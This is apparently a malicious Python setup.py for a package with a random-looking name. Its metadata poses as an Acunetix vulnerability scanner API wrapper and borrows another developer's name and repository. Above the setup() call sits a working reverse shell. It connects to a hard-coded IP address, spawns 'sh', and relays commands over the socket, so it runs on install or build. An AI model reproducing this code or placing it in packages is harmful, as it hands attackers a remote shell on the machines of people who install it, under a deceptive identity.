import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("130.61.249.187",1938))

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()

from setuptools import find_packages, setup

setup(
    name="fwkerhuejrjreg",
    version="0.0.1",
    packages=find_packages(),
    long_description="Acunetix Web Vulnerability Scanner API wrapper",
    keywords="acunetix vulnerability scanner pentest security infosec",
    python_requires=">=3.6",
    author="Daniil Gazizullin",
    author_email="me@hikariatama.ru",
    url="https://github.com/hikariatama/acunetix",
    download_url="https://github.com/hikariatama/acunetix/releases",
    install_requires=[],
)